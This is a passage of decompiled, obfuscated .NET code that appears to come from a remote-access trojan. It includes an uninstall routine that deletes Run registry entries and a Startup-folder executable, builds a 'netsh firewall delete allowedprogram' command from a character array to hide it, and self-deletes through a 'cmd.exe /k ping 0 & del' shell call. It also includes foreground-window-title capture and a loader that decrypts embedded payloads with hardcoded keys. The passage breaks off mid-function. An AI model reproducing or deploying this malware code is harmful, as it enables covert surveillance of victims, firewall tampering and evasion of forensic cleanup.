	static void smethod_90(Exception exception_0, object object_0, object object_1, object object_2)
	{
		Class24.smethod_144(exception_0, new object[3] { object_0, object_1, object_2 });
	}

	unsafe static int smethod_91(Class13.Class20.Class21 class21_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class21_0.short_0.Length)
		{
			*(int*)ptr += class21_0.short_0[*(int*)((byte*)ptr + 4)] * class21_0.byte_0[*(int*)((byte*)ptr + 4)];
			(*(int*)((byte*)ptr + 4))++;
		}
		*(int*)((byte*)ptr + 8) = *(int*)ptr;
		return *(int*)((byte*)ptr + 8);
	}

	unsafe static string smethod_92(int int_0, Class0 class0_0)
	{
		void* ptr = stackalloc byte[8];
		VBMath.Randomize();
		Random random = new Random();
		string text = "";
		string text2 = new string(new char[26]
		{
			'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
			'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
			'u', 'v', 'w', 'x', 'y', 'z'
		});
		*(int*)((byte*)ptr + 4) = int_0;
		*(int*)ptr = 1;
		while (*(int*)ptr <= *(int*)((byte*)ptr + 4))
		{
			text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
			checked
			{
				(*unchecked((int*)ptr))++;
			}
		}
		return text;
	}

	static int smethod_93()
	{
		Version version = new Version("6.7.1.61");
		return version.Major;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowThreadProcessId", ExactSpelling = true, SetLastError = true)]
	static extern int GetWindowThreadProcessId_1(IntPtr intptr_0, ref int int_0);

	unsafe static string smethod_94(Class0 class0_0)
	{
		void* ptr = stackalloc byte[8];
		string result;
		try
		{
			IntPtr foregroundWindow_ = Class24.GetForegroundWindow_1();
			if (foregroundWindow_ == IntPtr.Zero)
			{
				string string_ = new string(new char[1] { ' ' });
				result = Class24.smethod_134(class0_0, ref string_);
			}
			else
			{
				*(int*)((byte*)ptr + 4) = Class24.GetWindowTextLengthA((long)foregroundWindow_);
				string string_2;
				checked
				{
					string_2 = Strings.StrDup(*unchecked((int*)((byte*)ptr + 4)) + 1, new string(new char[1] { '*' }));
					Class24.GetWindowTextA(foregroundWindow_, ref string_2, *unchecked((int*)((byte*)ptr + 4)) + 1);
				}
				Class24.GetWindowThreadProcessId_1(foregroundWindow_, ref *(int*)ptr);
				if (*(int*)ptr != 0)
				{
					try
					{
						string string_ = Process.GetProcessById(*(int*)ptr).MainWindowTitle;
						result = Class24.smethod_134(class0_0, ref string_);
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						result = Class24.smethod_134(class0_0, ref string_2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					result = Class24.smethod_134(class0_0, ref string_2);
				}
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			string string_ = new string(new char[1] { ' ' });
			result = Class24.smethod_134(class0_0, ref string_);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static bool smethod_95()
	{
		try
		{
			Class39.Struct20 struct20_ = default(Class39.Struct20);
			Class24.GetSystemInfo(ref struct20_);
			return struct20_.ushort_0 == 9;
		}
		catch
		{
			return false;
		}
	}

	static bool smethod_96(Class13.Class22 class22_0)
	{
		return class22_0.int_8 == class22_0.int_7;
	}

	static void smethod_97(Class0 class0_0)
	{
		Class24.smethod_15(class0_0, 0);
		Class24.smethod_56(class0_0.class2_0);
		int num = 0;
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { class0_0.string_10, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				class0_0.string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object[] array4 = new object[2] { class0_0.string_5, false };
			object[] array5 = array4;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj2, (Type)null, "DeleteValue", array5, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				class0_0.string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array7 = new object[2] { class0_0.string_10, true };
			object[] array8 = array7;
			bool[] array6 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array8, (string[])null, (Type[])null, array6);
			if (array6[0])
			{
				class0_0.string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
			}
			object[] array9 = new object[2] { class0_0.string_5, false };
			object[] array10 = array9;
			bool[] array3 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj4, (Type)null, "DeleteValue", array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				class0_0.string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(new string(new char[37]
			{
				'n', 'e', 't', 's', 'h', ' ', 'f', 'i', 'r', 'e',
				'w', 'a', 'l', 'l', ' ', 'd', 'e', 'l', 'e', 't',
				'e', ' ', 'a', 'l', 'l', 'o', 'w', 'e', 'd', 'p',
				'r', 'o', 'g', 'r', 'a', 'm', ' '
			}) + "\""), NewLateBinding.LateGet(class0_0.object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"')), (AppWinStyle)0, false, -1);
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception ex6 = ex5;
			ProjectData.ClearProjectError();
		}
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + class0_0.string_5 + ".exe";
			File.Delete(path);
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj5 = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "OpenSubKey", new object[2]
			{
				new char[8] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e' },
				true
			}, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { class0_0.string_5, false };
			object[] array11 = array;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj5, (Type)null, "DeleteSubKey", array11, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				class0_0.string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9);
			Exception ex10 = ex9;
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"cmd.exe /k ping 0 & del \"", NewLateBinding.LateGet(class0_0.object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" & exit")), (AppWinStyle)0, false, -1);
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11);
			Exception ex12 = ex11;
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	static Icon smethod_98()
	{
		try
		{
			return Class24.smethod_35();
		}
		catch (Exception)
		{
			return Class24.smethod_107("default");
		}
	}

	static short smethod_99(int int_0)
	{
		return (short)((Class13.Class20.byte_0[int_0 & 0xF] << 12) | (Class13.Class20.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class13.Class20.byte_0[(int_0 >> 8) & 0xF] << 4) | Class13.Class20.byte_0[int_0 >> 12]);
	}

	unsafe static bool smethod_100(int int_0, Class13.Class22 class22_0)
	{
		void* ptr = stackalloc byte[23];
		int num = 128;
		*(int*)ptr = 128;
		short[] short_ = class22_0.short_1;
		int int_ = class22_0.int_4;
		*(int*)((byte*)ptr + 4) = class22_0.int_4 + class22_0.int_2;
		*(int*)((byte*)ptr + 8) = Math.Max(class22_0.int_2, 2);
		*(int*)((byte*)ptr + 12) = Math.Max(class22_0.int_4 - 32506, 0);
		*(int*)((byte*)ptr + 16) = class22_0.int_4 + 258 - 1;
		((byte*)ptr)[20] = class22_0.byte_0[*(int*)((byte*)ptr + 4) - 1];
		((byte*)ptr)[21] = class22_0.byte_0[*(int*)((byte*)ptr + 4)];
		if (*(int*)((byte*)ptr + 8) >= 8)
		{
			num >>= 2;
		}
		if (*(int*)ptr > class22_0.int_5)
		{
			*(int*)ptr = class22_0.int_5;
		}
		do
		{
			if (class22_0.byte_0[int_0 + *(int*)((byte*)ptr + 8)] != ((byte*)ptr)[21] || class22_0.byte_0[int_0 + *(int*)((byte*)ptr + 8) - 1] != ((byte*)ptr)[20] || class22_0.byte_0[int_0] != class22_0.byte_0[int_] || class22_0.byte_0[int_0 + 1] != class22_0.byte_0[int_ + 1])
			{
				continue;
			}
			int num2 = int_0 + 2;
			int_ += 2;
			while (class22_0.byte_0[++int_] == class22_0.byte_0[++num2] && class22_0.byte_0[++int_] == class22_0.byte_0[++num2] && class22_0.byte_0[++int_] == class22_0.byte_0[++num2] && class22_0.byte_0[++int_] == class22_0.byte_0[++num2] && class22_0.byte_0[++int_] == class22_0.byte_0[++num2] && class22_0.byte_0[++int_] == class22_0.byte_0[++num2] && class22_0.byte_0[++int_] == class22_0.byte_0[++num2] && class22_0.byte_0[++int_] == class22_0.byte_0[++num2] && int_ < *(int*)((byte*)ptr + 16))
			{
			}
			if (int_ > *(int*)((byte*)ptr + 4))
			{
				class22_0.int_1 = int_0;
				*(int*)((byte*)ptr + 4) = int_;
				*(int*)((byte*)ptr + 8) = int_ - class22_0.int_4;
				if (*(int*)((byte*)ptr + 8) >= *(int*)ptr)
				{
					break;
				}
				((byte*)ptr)[20] = class22_0.byte_0[*(int*)((byte*)ptr + 4) - 1];
				((byte*)ptr)[21] = class22_0.byte_0[*(int*)((byte*)ptr + 4)];
			}
			int_ = class22_0.int_4;
		}
		while ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > *(int*)((byte*)ptr + 12) && --num != 0);
		class22_0.int_2 = Math.Min(*(int*)((byte*)ptr + 8), class22_0.int_5);
		((byte*)ptr)[22] = ((class22_0.int_2 >= 3) ? ((byte)1) : ((byte)0));
		return ((byte*)ptr)[22] != 0;
	}

	static int smethod_101(Class13.Class23 class23_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class23_0.int_2 >= 8)
		{
			class23_0.byte_0[class23_0.int_1++] = (byte)class23_0.uint_0;
			class23_0.uint_0 >>= 8;
			class23_0.int_2 -= 8;
		}
		if (int_1 > class23_0.int_1 - class23_0.int_0)
		{
			int_1 = class23_0.int_1 - class23_0.int_0;
			Array.Copy(class23_0.byte_0, class23_0.int_0, byte_0, int_0, int_1);
			class23_0.int_0 = 0;
			class23_0.int_1 = 0;
		}
		else
		{
			Array.Copy(class23_0.byte_0, class23_0.int_0, byte_0, int_0, int_1);
			class23_0.int_0 += int_1;
		}
		return int_1;
	}

	static void smethod_102(Class0 class0_0, string string_0)
	{
		Class24.smethod_180(class0_0, Class24.smethod_198(ref string_0, class0_0));
	}

	unsafe static bool smethod_103(bool bool_0, bool bool_1, Class13.Class22 class22_0)
	{
		void* ptr = stackalloc byte[2];
		do
		{
			Class24.smethod_84(class22_0);
			bool bool_2 = bool_1 && class22_0.int_7 == class22_0.int_8;
			*(bool*)ptr = Class24.smethod_119(bool_2, bool_0, class22_0);
		}
		while (Class24.smethod_83(class22_0.class23_0) && *(bool*)ptr);
		((byte*)ptr)[1] = *(byte*)ptr;
		return ((byte*)ptr)[1] != 0;
	}

	static void smethod_104(Class13.Class23 class23_0, int int_0)
	{
		class23_0.byte_0[class23_0.int_1++] = (byte)int_0;
		class23_0.byte_0[class23_0.int_1++] = (byte)(int_0 >> 8);
	}

	static bool smethod_105(EventArgs1 eventArgs1_0)
	{
		return eventArgs1_0.bool_2;
	}

	static void smethod_106(ThreadStart threadStart_0, Form0 form0_0)
	{
		form0_0.thread_0 = new Thread(threadStart_0);
		form0_0.thread_0.Start();
	}

	static Icon smethod_107(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".ico");
			return (manifestResourceStream == null) ? ((Icon)null) : new Icon(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static bool smethod_108(EventArgs2 eventArgs2_0)
	{
		return eventArgs2_0.bool_2;
	}

	unsafe static void smethod_109(Class13.Class20.Class21 class21_0)
	{
		void* ptr = stackalloc byte[16];
		int[] array = new int[class21_0.int_3];
		*(int*)ptr = 0;
		class21_0.short_1 = new short[class21_0.short_0.Length];
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < class21_0.int_3)
		{
			array[*(int*)((byte*)ptr + 4)] = *(int*)ptr;
			*(int*)ptr += class21_0.int_2[*(int*)((byte*)ptr + 4)] << 15 - *(int*)((byte*)ptr + 4);
			(*(int*)((byte*)ptr + 4))++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < class21_0.int_1)
		{
			*(int*)((byte*)ptr + 12) = class21_0.byte_0[*(int*)((byte*)ptr + 8)];
			if (*(int*)((byte*)ptr + 12) > 0)
			{
				class21_0.short_1[*(int*)((byte*)ptr + 8)] = Class24.smethod_99(array[*(int*)((byte*)ptr + 12) - 1]);
				int[] array2;
				int[] array3 = (array2 = array);
				int num = *(int*)((byte*)ptr + 12) - 1;
				nint num2 = num;
				array3[num] = array2[num2] + (1 << 16 - *(int*)((byte*)ptr + 12));
			}
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	static Enum0 smethod_110(EventArgs3 eventArgs3_0)
	{
		return eventArgs3_0.enum0_0;
	}

	static bool smethod_111(EventArgs1 eventArgs1_0)
	{
		if (!eventArgs1_0.bool_1)
		{
			return false;
		}
		return eventArgs1_0.class28_0.method_7();
	}

	unsafe static int smethod_112(Class13.Class22 class22_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = ((class22_0.int_0 << 5) ^ class22_0.byte_0[class22_0.int_4 + 2]) & 0x7FFF;
		short num = (class22_0.short_1[class22_0.int_4 & 0x7FFF] = class22_0.short_0[*(int*)ptr]);
		class22_0.short_0[*(int*)ptr] = (short)class22_0.int_4;
		class22_0.int_0 = *(int*)ptr;
		*(int*)((byte*)ptr + 4) = num & 0xFFFF;
		return *(int*)((byte*)ptr + 4);
	}

	static void smethod_113(Control1 control1_0, Enum1 enum1_0)
	{
		if (control1_0.enum1_0 != enum1_0)
		{
			control1_0.enum1_0 = enum1_0;
			switch (control1_0.enum1_0)
			{
			default:
				control1_0.bitmap_0 = null;
				break;
			case Enum1.const_1:
				control1_0.bitmap_0 = Class24.smethod_116("error16");
				break;
			case Enum1.const_2:
				control1_0.bitmap_0 = Class24.smethod_116("warning16");
				break;
			}
			((Control)control1_0).Refresh();
		}
	}

	static void smethod_114(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8, object object_9)
	{
		Class24.smethod_144(exception_0, new object[10] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8, object_9 });
	}

	static void smethod_115(string string_0, Class0 class0_0)
	{
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(class0_0.object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CreateSubKey", new object[1] { new string(new char[9] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\' }) + class0_0.string_5 }, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[1] { string_0 };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall(obj, (Type)null, "DeleteValue", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				string_0 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	static Bitmap smethod_116(string string_0)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".png");
			return (manifestResourceStream == null) ? ((Bitmap)null) : new Bitmap(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static Class13.Class17 smethod_117(Class13.Class18 class18_0)
	{
		byte[] array = new byte[class18_0.int_3];
		Array.Copy(class18_0.byte_1, 0, array, 0, class18_0.int_3);
		return new Class13.Class17(array);
	}

	unsafe static byte[] smethod_118(byte[] byte_0)
	{
		void* ptr = stackalloc byte[46];
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class24.smethod_88(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class13.Stream0 stream = new Class13.Stream0(byte_0);
		byte[] array = new byte[0];
		*(int*)ptr = Class24.smethod_151(stream);
		if (*(int*)ptr == 67324752)
		{
			*(short*)((byte*)ptr + 44) = (short)Class24.smethod_158(stream);
			*(int*)((byte*)ptr + 4) = Class24.smethod_158(stream);
			*(int*)((byte*)ptr + 8) = Class24.smethod_158(stream);
			if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class24.smethod_151(stream);
			Class24.smethod_151(stream);
			Class24.smethod_151(stream);
			*(int*)((byte*)ptr + 12) = Class24.smethod_151(stream);
			*(int*)((byte*)ptr + 16) = Class24.smethod_158(stream);
			*(int*)((byte*)ptr + 20) = Class24.smethod_158(stream);
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				byte[] buffer = new byte[*(int*)((byte*)ptr + 16)];
				stream.Read(buffer, 0, *(int*)((byte*)ptr + 16));
			}
			if (*(int*)((byte*)ptr + 20) > 0)
			{
				byte[] buffer2 = new byte[*(int*)((byte*)ptr + 20)];
				stream.Read(buffer2, 0, *(int*)((byte*)ptr + 20));
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class13.Class14 class14_ = new Class13.Class14(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			Class24.smethod_130(array.Length, 0, class14_, array);
			array2 = null;
		}
		else
		{
			*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
			*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
			if (*(int*)ptr != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (*(int*)((byte*)ptr + 24) == 1)
			{
				*(int*)((byte*)ptr + 28) = Class24.smethod_151(stream);
				array = new byte[*(int*)((byte*)ptr + 28)];
				*(int*)((byte*)ptr + 32) = 0;
				while (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
				{
					*(int*)((byte*)ptr + 36) = Class24.smethod_151(stream);
					*(int*)((byte*)ptr + 40) = Class24.smethod_151(stream);
					byte[] array3 = new byte[*(int*)((byte*)ptr + 36)];
					stream.Read(array3, 0, array3.Length);
					Class13.Class14 class14_2 = new Class13.Class14(array3);
					Class24.smethod_130(*(int*)((byte*)ptr + 40), *(int*)((byte*)ptr + 32), class14_2, array);
					*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 40);
				}
			}
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] byte_ = new byte[8] { 249, 184, 80, 200, 126, 208, 34, 230 };
				byte[] byte_2 = new byte[8] { 75, 96, 12, 85, 187, 152, 113, 118 };
				using Class12 class12_ = new Class12();
				using ICryptoTransform cryptoTransform = Class24.smethod_89(bool_0: true, byte_, class12_, byte_2);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class24.smethod_118(byte_3);
			}
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using Class11 class11_ = new Class11();
				using ICryptoTransform cryptoTransform2 = Class24.smethod_66(byte_5, class11_, bool_0: true, byte_4);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class24.smethod_118(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	unsafe static bool smethod_119(bool bool_0, bool bool_1, Class13.Class22 class22_0)
	{
		void* ptr = stackalloc byte[25];
		if (class22_0.int_5 < 262 && !bool_0)
		{
			((byte*)ptr)[24] = 0;
		}
		else
		{
			while (true)
			{
				if (class22_0.int_5 >= 262 || bool_0)
				{
					Class13.Class20 class20_2;
					byte[] byte_;
					if (class22_0.int_5 != 0)
					{
						if (class22_0.int_4 >= 65274)
						{
							Class24.smethod_34(class22_0);
						}
						*(int*)ptr = class22_0.int_1;
						int int_ = class22_0.int_2;
						if (class22_0.int_5 >= 3)
						{
							*(int*)((byte*)ptr + 4) = Class24.smethod_112(class22_0);
							if (*(int*)((byte*)ptr + 4) != 0 && class22_0.int_4 - *(int*)((byte*)ptr + 4) <= 32506 && Class24.smethod_100(*(int*)((byte*)ptr + 4), class22_0) && class22_0.int_2 <= 5 && class22_0.int_2 == 3 && class22_0.int_4 - class22_0.int_1 > 4096)
							{
								class22_0.int_2 = 2;
							}
						}
						if (int_ >= 3 && class22_0.int_2 <= int_)
						{
							Class13.Class20 class20_ = class22_0.class20_0;
							*(int*)((byte*)ptr + 16) = class22_0.int_4 - 1 - *(int*)ptr;
							Class24.smethod_37(int_, *(int*)((byte*)ptr + 16), class20_);
							int_ -= 2;
							do
							{
								class22_0.int_4++;
								class22_0.int_5--;
								if (class22_0.int_5 >= 3)
								{
									Class24.smethod_112(class22_0);
								}
							}
							while (--int_ > 0);
							class22_0.int_4++;
							class22_0.int_5--;
							class22_0.bool_0 = false;
							class22_0.int_2 = 2;
						}
						else
						{
							if (class22_0.bool_0)
							{
								Class24.smethod_14(class22_0.class20_0, class22_0.byte_0[class22_0.int_4 - 1] & 0xFF);
							}
							class22_0.bool_0 = true;
							class22_0.int_4++;
							class22_0.int_5--;
						}
						if (Class24.smethod_53(class22_0.class20_0))
						{
							*(int*)((byte*)ptr + 8) = class22_0.int_4 - class22_0.int_3;
							if (class22_0.bool_0)
							{
								(*(int*)((byte*)ptr + 8))--;
							}
							bool flag = bool_1 && class22_0.int_5 == 0 && !class22_0.bool_0;
							class20_2 = class22_0.class20_0;
							byte_ = class22_0.byte_0;
							*(int*)((byte*)ptr + 12) = class22_0.int_3;
							Class24.smethod_122(*(int*)((byte*)ptr + 8), class20_2, byte_, flag, *(int*)((byte*)ptr + 12));
							class22_0.int_3 += *(int*)((byte*)ptr + 8);
							((byte*)ptr)[24] = ((!flag) ? ((byte)1) : ((byte)0));
							break;
						}
						continue;
					}
					if (class22_0.bool_0)
					{
						Class24.smethod_14(class22_0.class20_0, class22_0.byte_0[class22_0.int_4 - 1] & 0xFF);
					}
					class22_0.bool_0 = false;
					class20_2 = class22_0.class20_0;
					byte_ = class22_0.byte_0;
					*(int*)((byte*)ptr + 12) = class22_0.int_3;
					*(int*)((byte*)ptr + 20) = class22_0.int_4 - class22_0.int_3;
					Class24.smethod_122(*(int*)((byte*)ptr + 20), class20_2, byte_, bool_1, *(int*)((byte*)ptr + 12));
					class22_0.int_3 = class22_0.int_4;
					((byte*)ptr)[24] = 0;
					break;
				}
				((byte*)ptr)[24] = 1;
				break;
			}
		}
		return ((byte*)ptr)[24] != 0;
	}

	static void smethod_120(Exception exception_0, object object_0, object object_1)
	{
		Class24.smethod_144(exception_0, new object[2] { object_0, object_1 });
	}

	static byte[] smethod_121(byte[] byte_0)
	{
		return Class24.smethod_80((byte[])null, byte_0, (byte[])null, 1);
	}

	[DllImport("user32", CharSet = CharSet.Unicode)]
	static extern int DrawText(IntPtr intptr_0, string string_0, int int_0, ref Class39.Struct18 struct18_0, int int_1);

	unsafe static void smethod_122(int int_0, Class13.Class20 class20_0, byte[] byte_0, bool bool_0, int int_1)
	{
		void* ptr = stackalloc byte[24];
		short[] short_;
		(short_ = class20_0.class21_0.short_0)[256] = (short)(short_[256] + 1);
		Class24.smethod_124(class20_0.class21_0);
		Class24.smethod_124(class20_0.class21_1);
		Class13.Class20.Class21 class21_ = class20_0.class21_0;
		Class13.Class20.Class21 class21_2 = class20_0.class21_2;
		Class24.smethod_123(class21_2, class21_);
		class21_ = class20_0.class21_1;
		class21_2 = class20_0.class21_2;
		Class24.smethod_123(class21_2, class21_);
		Class24.smethod_124(class20_0.class21_2);
		*(int*)ptr = 4;
		*(int*)((byte*)ptr + 4) = 18;
		while (*(int*)((byte*)ptr + 4) > *(int*)ptr)
		{
			if (class20_0.class21_2.byte_0[Class13.Class20.int_0[*(int*)((byte*)ptr + 4)]] > 0)
			{
				*(int*)ptr = *(int*)((byte*)ptr + 4) + 1;
			}
			(*(int*)((byte*)ptr + 4))--;
		}
		*(int*)((byte*)ptr + 8) = 14 + *(int*)ptr * 3 + Class24.smethod_91(class20_0.class21_2) + Class24.smethod_91(class20_0.class21_0) + Class24.smethod_91(class20_0.class21_1) + class20_0.int_2;
		*(int*)((byte*)ptr + 12) = class20_0.int_2;
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < 286)
		{
			*(int*)((byte*)ptr + 12) += class20_0.class21_0.short_0[*(int*)((byte*)ptr + 16)] * Class13.Class20.byte_2[*(int*)((byte*)ptr + 16)];
			(*(int*)((byte*)ptr + 16))++;
		}
		*(int*)((byte*)ptr + 20) = 0;
		while (*(int*)((byte*)ptr + 20) < 30)
		{
			*(int*)((byte*)ptr + 12) += class20_0.class21_1.short_0[*(int*)((byte*)ptr + 20)] * Class13.Class20.byte_3[*(int*)((byte*)ptr + 20)];
			(*(int*)((byte*)ptr + 20))++;
		}
		if (*(int*)((byte*)ptr + 8) >= *(int*)((byte*)ptr + 12))
		{
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 12);
		}
		if (int_1 >= 0 && int_0 + 4 < *(int*)((byte*)ptr + 8) >> 3)
		{
			Class24.smethod_43(int_0, class20_0, byte_0, int_1, bool_0);
		}
		else if (*(int*)((byte*)ptr + 8) == *(int*)((byte*)ptr + 12))
		{
			Class24.smethod_188(class20_0.class23_0, 2 + (bool_0 ? 1 : 0), 3);
			Class13.Class20.Class21 class21_3 = class20_0.class21_0;
			short[] short_2 = Class13.Class20.short_1;
			byte[] byte_ = Class13.Class20.byte_2;
			Class24.smethod_140(byte_, short_2, class21_3);
			class21_3 = class20_0.class21_1;
			short_2 = Class13.Class20.short_2;
			byte_ = Class13.Class20.byte_3;
			Class24.smethod_140(byte_, short_2, class21_3);
			Class24.smethod_154(class20_0);
			Class24.smethod_17(class20_0);
		}
		else
		{
			Class24.smethod_188(class20_0.class23_0, 4 + (bool_0 ? 1 : 0), 3);
			Class24.smethod_31(class20_0, *(int*)ptr);
			Class24.smethod_154(class20_0);
			Class24.smethod_17(class20_0);
		}
	}

	unsafe static void smethod_123(Class13.Class20.Class21 class21_0, Class13.Class20.Class21 class21_1)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class21_1.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = class21_1.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					short[] short_;
					short[] array = (short_ = class21_0.short_0);
					int num2 = *(int*)((byte*)ptr + 16);
					nint num3 = num2;
					array[num2] = (short)(short_[num3] + 1);
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
